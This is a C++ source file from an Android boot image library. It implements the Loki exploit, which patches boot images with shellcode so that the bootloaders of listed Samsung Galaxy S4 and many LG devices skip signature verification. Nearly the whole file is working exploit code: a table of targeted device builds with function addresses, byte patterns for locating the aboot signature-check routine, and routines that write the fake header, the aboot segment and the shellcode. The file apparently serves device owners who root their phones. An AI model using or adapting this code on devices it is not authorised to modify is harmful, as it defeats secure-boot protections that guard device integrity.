/*
 * Copyright (c) 2013 Dan Rosenberg. All rights reserved.
 * Copyright (c) 2015-2017 Andrew Gunnerson <andrewgunnerson@gmail.com>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in
 * the documentation and/or other materials provided with the
 * distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL INFRAE OR
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "mbbootimg/format/loki_p.h"

#include <cstddef>
#include <cstdio>
#include <cstring>

#include "mbcommon/endian.h"
#include "mbcommon/file.h"
#include "mbcommon/file_util.h"

#include "mbbootimg/format/align_p.h"
#include "mbbootimg/format/android_p.h"
#include "mbbootimg/writer.h"

struct LokiTarget
{
    const char *vendor;
    const char *device;
    const char *build;
    uint32_t check_sigs;
    uint32_t hdr;
    bool lg;
};

static LokiTarget targets[] = {
    { "AT&T",                  "Samsung Galaxy S4",      "JDQ39.I337UCUAMDB or JDQ39.I337UCUAMDL",     0x88e0ff98, 0x88f3bafc, false },
    { "Verizon",               "Samsung Galaxy S4",      "JDQ39.I545VRUAMDK",                          0x88e0fe98, 0x88f372fc, false },
    { "DoCoMo",                "Samsung Galaxy S4",      "JDQ39.SC04EOMUAMDI",                         0x88e0fcd8, 0x88f0b2fc, false },
    { "Verizon",               "Samsung Galaxy Stellar", "IMM76D.I200VRALH2",                          0x88e0f5c0, 0x88ed32e0, false },
    { "Verizon",               "Samsung Galaxy Stellar", "JZO54K.I200VRBMA1",                          0x88e101ac, 0x88ed72e0, false },
    { "T-Mobile",              "LG Optimus F3Q",         "D52010c",                                    0x88f1079c, 0x88f64508, true  },
    { "DoCoMo",                "LG Optimus G",           "L01E20b",                                    0x88F10E48, 0x88F54418, true  },
    { "DoCoMo",                "LG Optimus it L05E",     "L05E10d",                                    0x88f1157c, 0x88f31e10, true  },
    { "DoCoMo",                "LG Optimus G Pro",       "L04E10f",                                    0x88f1102c, 0x88f54418, true  },
    { "AT&T or HK",            "LG Optimus G Pro",       "E98010g or E98810b",                         0x88f11084, 0x88f54418, true  },
    { "KT, LGU, or SKT",       "LG Optimus G Pro",       "F240K10o, F240L10v, or F240S10w",            0x88f110b8, 0x88f54418, true  },
    { "KT, LGU, or SKT",       "LG Optimus LTE 2",       "F160K20g, F160L20f, F160LV20d, or F160S20f", 0x88f10864, 0x88f802b8, true  },
    { "MetroPCS",              "LG Spirit",              "MS87010a_05",                                0x88f0e634, 0x88f68194, true  },
    { "MetroPCS",              "LG Motion",              "MS77010f_01",                                0x88f1015c, 0x88f58194, true  },
    { "Verizon",               "LG Lucid 2",             "VS87010B_12",                                0x88f10adc, 0x88f702bc, true  },
    { "Verizon",               "LG Spectrum 2",          "VS93021B_05",                                0x88f10c10, 0x88f84514, true  },
    { "Boost Mobile",          "LG Optimus F7",          "LG870ZV4_06",                                0x88f11714, 0x88f842ac, true  },
    { "US Cellular",           "LG Optimus F7",          "US78011a",                                   0x88f112c8, 0x88f84518, true  },
    { "Sprint",                "LG Optimus F7",          "LG870ZV5_02",                                0x88f11710, 0x88f842a8, true  },
    { "Virgin Mobile",         "LG Optimus F3",          "LS720ZV5",                                   0x88f108f0, 0x88f854f4, true  },
    { "T-Mobile and MetroPCS", "LG Optimus F3",          "LS720ZV5",                                   0x88f10264, 0x88f64508, true  },
    { "AT&T",                  "LG G2",                  "D80010d",                                     0xf8132ac,  0xf906440, true  },
    { "Verizon",               "LG G2",                  "VS98010b",                                    0xf8131f0,  0xf906440, true  },
    { "AT&T",                  "LG G2",                  "D80010o",                                     0xf813428,  0xf904400, true  },
    { "Verizon",               "LG G2",                  "VS98012b",                                    0xf813210,  0xf906440, true  },
    { "T-Mobile or Canada",    "LG G2",                  "D80110c or D803",                             0xf813294,  0xf906440, true  },
    { "International",         "LG G2",                  "D802b",                                       0xf813a70,  0xf9041c0, true  },
    { "Sprint",                "LG G2",                  "LS980ZV7",                                    0xf813460,  0xf9041c0, true  },
    { "KT or LGU",             "LG G2",                  "F320K, F320L",                                0xf81346c,  0xf8de440, true  },
    { "SKT",                   "LG G2",                  "F320S",                                       0xf8132e4,  0xf8ee440, true  },
    { "SKT",                   "LG G2",                  "F320S11c",                                    0xf813470,  0xf8de440, true  },
    { "DoCoMo",                "LG G2",                  "L-01F",                                       0xf813538,  0xf8d41c0, true  },
    { "KT",                    "LG G Flex",              "F340K",                                       0xf8124a4,  0xf8b6440, true  },
    { "KDDI",                  "LG G Flex",              "LGL2310d",                                    0xf81261c,  0xf8b41c0, true  },
    { "International",         "LG Optimus F5",          "P87510e",                                    0x88f10a9c, 0x88f702b8, true  },
    { "SKT",                   "LG Optimus LTE 3",       "F260S10l",                                   0x88f11398, 0x88f8451c, true  },
    { "International",         "LG G Pad 8.3",           "V50010a",                                    0x88f10814, 0x88f801b8, true  },
    { "International",         "LG G Pad 8.3",           "V50010c or V50010e",                         0x88f108bc, 0x88f801b8, true  },
    { "Verizon",               "LG G Pad 8.3",           "VK81010c",                                   0x88f11080, 0x88fd81b8, true  },
    { "International",         "LG Optimus L9 II",       "D60510a",                                    0x88f10d98, 0x88f84aa4, true  },
    { "MetroPCS",              "LG Optimus F6",          "MS50010e",                                   0x88f10260, 0x88f70508, true  },
    { "Open EU",               "LG Optimus F6",          "D50510a",                                    0x88f10284, 0x88f70aa4, true  },
    { "KDDI",                  "LG Isai",                "LGL22",                                       0xf813458,  0xf8d41c0, true  },
    { "KDDI",                  "LG",                     "LGL21",                                      0x88f10218, 0x88f50198, true  },
    { "KT",                    "LG Optimus GK",          "F220K",                                      0x88f11034, 0x88f54418, true  },
    { "International",         "LG Vu 3",                "F300L",                                       0xf813170,  0xf8d2440, true  },
    { "Sprint",                "LG Viper",               "LS840ZVK",                                   0x4010fe18, 0x40194198, true  },
    { "International",         "LG G Flex",              "D95510a",                                     0xf812490,  0xf8c2440, true  },
    { "Sprint",                "LG Mach",                "LS860ZV7",                                   0x88f102b4, 0x88f6c194, true  }
};

#define PATTERN1                    "\xf0\xb5\x8f\xb0\x06\x46\xf0\xf7"
#define PATTERN2                    "\xf0\xb5\x8f\xb0\x07\x46\xf0\xf7"
#define PATTERN3                    "\x2d\xe9\xf0\x41\x86\xb0\xf1\xf7"
#define PATTERN4                    "\x2d\xe9\xf0\x4f\xad\xf5\xc6\x6d"
#define PATTERN5                    "\x2d\xe9\xf0\x4f\xad\xf5\x21\x7d"
#define PATTERN6                    "\x2d\xe9\xf0\x4f\xf3\xb0\x05\x46"

#define ABOOT_SEARCH_LIMIT          0x1000
#define ABOOT_PATTERN_SIZE          8
#define MIN_ABOOT_SIZE              (ABOOT_SEARCH_LIMIT + ABOOT_PATTERN_SIZE)


MB_BEGIN_C_DECLS

static bool _patch_shellcode(uint32_t header, uint32_t ramdisk,
                             unsigned char patch[LOKI_SHELLCODE_SIZE])
{
    bool found_header = false;
    bool found_ramdisk = false;
    uint32_t *ptr;

    for (size_t i = 0; i < LOKI_SHELLCODE_SIZE - sizeof(uint32_t); ++i) {
        // Safe with little and big endian
        ptr = reinterpret_cast<uint32_t *>(&patch[i]);
        if (*ptr == 0xffffffff) {
            *ptr = mb_htole32(header);
            found_header = true;
        } else if (*ptr == 0xeeeeeeee) {
            *ptr = mb_htole32(ramdisk);
            found_ramdisk = true;
        }
    }

    return found_header && found_ramdisk;
}

static int _loki_read_android_header(MbBiWriter *biw, MbFile *file,
                                     AndroidHeader *ahdr)
{
    size_t n;
    int ret;

    ret = mb_file_seek(file, 0, SEEK_SET, nullptr);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to seek to beginning: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    }

    ret = mb_file_read_fully(file, ahdr, sizeof(*ahdr), &n);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to read Android header: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    } else if (n != sizeof(*ahdr)) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Unexpected EOF when reading Android header: %s",
                               mb_file_error_string(file));
        return MB_BI_FAILED;
    }

    android_fix_header_byte_order(ahdr);

    return MB_BI_OK;
}

static int _loki_write_android_header(MbBiWriter *biw, MbFile *file,
                                      const AndroidHeader *ahdr)
{
    AndroidHeader dup = *ahdr;
    size_t n;
    int ret;

    android_fix_header_byte_order(&dup);

    ret = mb_file_seek(file, 0, SEEK_SET, nullptr);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to seek to beginning: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    }

    ret = mb_file_write_fully(file, &dup, sizeof(dup), &n);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to write Android header: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    } else if (n != sizeof(dup)) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Unexpected EOF when writing Android header: %s",
                               mb_file_error_string(file));
        return MB_BI_FAILED;
    }

    return MB_BI_OK;
}

static int _loki_write_loki_header(MbBiWriter *biw, MbFile *file,
                                   const LokiHeader *lhdr)
{
    LokiHeader dup = *lhdr;
    size_t n;
    int ret;

    loki_fix_header_byte_order(&dup);

    ret = mb_file_seek(file, LOKI_MAGIC_OFFSET, SEEK_SET, nullptr);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to seek to Loki header offset: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    }

    ret = mb_file_write_fully(file, &dup, sizeof(dup), &n);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to write Loki header: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    } else if (n != sizeof(dup)) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Unexpected EOF when writing Loki header: %s",
                               mb_file_error_string(file));
        return MB_BI_FAILED;
    }

    return MB_BI_OK;
}

static int _loki_move_dt_image(MbBiWriter *biw, MbFile *file,
                               uint64_t aboot_offset, uint32_t fake_size,
                               uint32_t dt_size)
{
    uint64_t n;
    int ret;

    // Move DT image
    ret = mb_file_move(file, aboot_offset, aboot_offset + fake_size,
                       dt_size, &n);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to move DT image: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    } else if (n != dt_size) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "DT image truncated when moving");
        // Non-recoverable
        return MB_BI_FATAL;
    }

    return MB_BI_OK;
}

static int _loki_write_aboot(MbBiWriter *biw, MbFile *file,
                             const unsigned char *aboot, size_t aboot_size,
                             uint64_t aboot_offset, size_t aboot_func_offset,
                             uint32_t fake_size)
{
    size_t n;
    int ret;

    if (aboot_func_offset > SIZE_MAX - fake_size
            || aboot_func_offset + fake_size > aboot_size) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "aboot func offset + fake size out of range");
        return MB_BI_FAILED;
    }

    ret = mb_file_seek(file, aboot_offset, SEEK_SET, nullptr);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to seek to ramdisk offset: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    }

    ret = mb_file_write_fully(file, aboot + aboot_func_offset, fake_size, &n);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to write aboot segment: %s",
                               mb_file_error_string(file));
        return MB_BI_FATAL;
    } else if (n != fake_size) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Unexpected EOF when writing aboot segment: %s",
                               mb_file_error_string(file));
        return MB_BI_FATAL;
    }

    return MB_BI_OK;
}

static int _loki_write_shellcode(MbBiWriter *biw, MbFile *file,
                                 uint64_t aboot_offset,
                                 uint32_t aboot_func_align,
                                 unsigned char patch[LOKI_SHELLCODE_SIZE])
{
    size_t n;
    int ret;

    ret = mb_file_seek(file, aboot_offset + aboot_func_align, SEEK_SET,
                       nullptr);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to seek to shellcode offset: %s",
                               mb_file_error_string(file));
        return MB_BI_FAILED;
    }

    ret = mb_file_write_fully(file, patch, LOKI_SHELLCODE_SIZE, &n);
    if (ret != MB_FILE_OK) {
        mb_bi_writer_set_error(biw, mb_file_error(file),
                               "Failed to write shellcode: %s",
                               mb_file_error_string(file));
        return ret == MB_FILE_FATAL ? MB_BI_FATAL : MB_BI_FAILED;
    } else if (n != LOKI_SHELLCODE_SIZE) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Unexpected EOF when writing shellcode: %s",
                               mb_file_error_string(file));
        return MB_BI_FATAL;
    }

    return MB_BI_OK;
}

/*!
 * \brief Patch Android boot image with Loki exploit in-place
 *
 * \param biw MbBiWriter instance for setting error message
 * \param file MbFile handle
 * \param aboot aboot image
 * \param aboot_size Size of aboot image
 *
 * \return
 *   * #MB_BI_OK if the boot image is successfully patched
 *   * #MB_BI_FAILED if a file operation fails non-fatally
 *   * #MB_BI_FATAL if a file operation fails fatally
 */
int _loki_patch_file(MbBiWriter *biw, MbFile *file,
                     const void *aboot, size_t aboot_size)
{
    const unsigned char *aboot_ptr =
            reinterpret_cast<const unsigned char *>(aboot);
    unsigned char patch[] = LOKI_SHELLCODE;
    uint32_t target = 0;
    uint32_t aboot_base;
    int offset;
    int fake_size;
    size_t aboot_func_offset;
    uint64_t aboot_offset;
    LokiTarget *tgt = nullptr;
    AndroidHeader ahdr;
    LokiHeader lhdr;
    int ret;

    if (aboot_size < MIN_ABOOT_SIZE) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_INVALID_ARGUMENT,
                               "aboot image size is too small");
        return MB_BI_FAILED;
    }

    aboot_base = mb_le32toh(*reinterpret_cast<const uint32_t *>(
            aboot_ptr + 12)) - 0x28;

    // Find the signature checking function via pattern matching
    for (const unsigned char *ptr = aboot_ptr;
            ptr < aboot_ptr + aboot_size - ABOOT_SEARCH_LIMIT; ++ptr) {
        if (memcmp(ptr, PATTERN1, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN2, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN3, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN4, ABOOT_PATTERN_SIZE) == 0
                || memcmp(ptr, PATTERN5, ABOOT_PATTERN_SIZE) == 0) {
            target = static_cast<uint32_t>(ptr - aboot_ptr + aboot_base);
            break;
        }
    }

    // Do a second pass for the second LG pattern. This is necessary because
    // apparently some LG models have both LG patterns, which throws off the
    // fingerprinting.

    if (target == 0) {
        for (const unsigned char *ptr = aboot_ptr;
                ptr < aboot_ptr + aboot_size - ABOOT_SEARCH_LIMIT; ++ptr) {
            if (memcmp(ptr, PATTERN6, ABOOT_PATTERN_SIZE) == 0) {
                target = static_cast<uint32_t>(ptr - aboot_ptr + aboot_base);
                break;
            }
        }
    }

    if (target == 0) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Failed to find aboot function to patch");
        return MB_BI_FAILED;
    }

    for (size_t i = 0; i < (sizeof(targets) / sizeof(targets[0])); ++i) {
        if (targets[i].check_sigs == target) {
            tgt = &targets[i];
            break;
        }
    }

    if (!tgt) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Unsupported aboot image");
        return MB_BI_FAILED;
    }

    ret = _loki_read_android_header(biw, file, &ahdr);
    if (ret != MB_BI_OK) {
        return ret;
    }

    // Set up Loki header
    memset(&lhdr, 0, sizeof(lhdr));

    memcpy(lhdr.magic, LOKI_MAGIC, LOKI_MAGIC_SIZE);
    lhdr.recovery = 0;
    strncpy(lhdr.build, tgt->build, sizeof(lhdr.build) - 1);

    // Store the original values in unused fields of the header
    lhdr.orig_kernel_size = ahdr.kernel_size;
    lhdr.orig_ramdisk_size = ahdr.ramdisk_size;
    lhdr.ramdisk_addr = ahdr.kernel_addr + ahdr.kernel_size
            + align_page_size<uint32_t>(ahdr.kernel_size, ahdr.page_size);

    if (!_patch_shellcode(tgt->hdr, ahdr.ramdisk_addr, patch)) {
        mb_bi_writer_set_error(biw, MB_BI_ERROR_FILE_FORMAT,
                               "Failed to patch shellcode");
        return MB_BI_FAILED;
    }

    // Ramdisk must be aligned to a page boundary
    ahdr.kernel_size = ahdr.kernel_size
            + align_page_size<uint32_t>(ahdr.kernel_size, ahdr.page_size)
            + ahdr.ramdisk_size;

    // Guarantee 16-byte alignment
    offset = tgt->check_sigs & 0xf;
    ahdr.ramdisk_addr = tgt->check_sigs - offset;

    if (tgt->lg) {
        fake_size = ahdr.page_size;
        ahdr.ramdisk_size = ahdr.page_size;
    } else {
        fake_size = 0x200;
        ahdr.ramdisk_size = 0;
    }

    aboot_func_offset = tgt->check_sigs - aboot_base - offset;

    // Write Android header
    ret = _loki_write_android_header(biw, file, &ahdr);
    if (ret != MB_BI_OK) {
        return ret;
    }

    // Write Loki header
    ret = _loki_write_loki_header(biw, file, &lhdr);
    if (ret != MB_BI_OK) {
        return ret;
    }

    aboot_offset = static_cast<uint64_t>(ahdr.page_size)
            + lhdr.orig_kernel_size
            + align_page_size<uint32_t>(lhdr.orig_kernel_size, ahdr.page_size)
            + lhdr.orig_ramdisk_size
            + align_page_size<uint32_t>(lhdr.orig_ramdisk_size, ahdr.page_size);

    // The function calls below are no longer recoverable should an error occur

    // Move DT image
    ret = _loki_move_dt_image(biw, file, aboot_offset, fake_size, ahdr.dt_size);
    if (ret != MB_BI_OK) {
        return MB_BI_FATAL;
    }

    // Write aboot
    ret = _loki_write_aboot(biw, file, aboot_ptr, aboot_size, aboot_offset,
                            aboot_func_offset, fake_size);
    if (ret != MB_BI_OK) {
        return MB_BI_FATAL;
    }

    // Write shellcode
    ret = _loki_write_shellcode(biw, file, aboot_offset, offset, patch);
    if (ret != MB_BI_OK) {
        return MB_BI_FATAL;
    }

    return MB_BI_OK;
}

MB_END_C_DECLS
